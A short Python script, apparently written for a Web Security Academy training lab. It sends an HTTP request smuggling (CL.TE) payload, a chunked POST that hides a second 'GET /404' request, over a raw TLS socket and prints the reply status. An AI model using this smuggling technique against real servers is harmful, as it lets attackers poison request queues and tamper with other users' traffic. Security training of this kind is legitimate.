import ssl, socket

host = "<lab-url>.web-security-academy.net"
body = b"0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X"

ctx = ssl.create_default_context()
with socket.create_connection((host, 443), timeout=10) as raw:
    with ctx.wrap_socket(raw, server_hostname=host) as sock:
        sock.settimeout(5)
        req = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
        ).encode() + body
        sock.sendall(req)
        print(sock.recv(4096).split(b"\r\n", 1)[0].decode())
